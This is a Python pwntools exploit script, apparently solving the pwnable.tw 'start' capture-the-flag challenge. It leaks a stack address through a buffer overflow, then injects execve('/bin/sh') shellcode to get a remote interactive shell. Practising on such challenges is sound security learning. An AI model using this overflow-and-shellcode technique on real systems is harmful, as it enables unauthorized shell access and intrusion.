from pwn import *

context(arch='i386', os='linux')

conn = remote("chall.pwnable.tw", 10000)

mov_ecx_esp = p32(0x08048087)
offset = 20

payload = cyclic(offset)
payload += mov_ecx_esp

print(conn.read())
log.info("Leaking stack address")
conn.send(payload)
stack_addr = unpack(conn.read()[:4])

shellcode = asm("mov al, 0xb") #sys_execve
shellcode += asm("xor ecx,ecx") #arg null
shellcode += asm("xor edx,edx") #arg null
shellcode += asm("xor esi, esi") #arg null
shellcode += asm("push 0x" + "/sh\x00"[::-1].encode("hex"))
shellcode += asm("push 0x" + "/bin"[::-1].encode("hex"))
shellcode += asm("mov ebx, esp") #move string to ebx (arg)
shellcode += asm("int 0x80") #syscall
shellcode += asm("push 0x0804809D") #after shellcode
shellcode += asm("ret") #return to address above

payload = cyclic(offset) 
payload += p32(stack_addr+offset)  
payload += shellcode
log.info("Sending shellcode payload")

conn.send(payload)
conn.interactive()

conn.close()
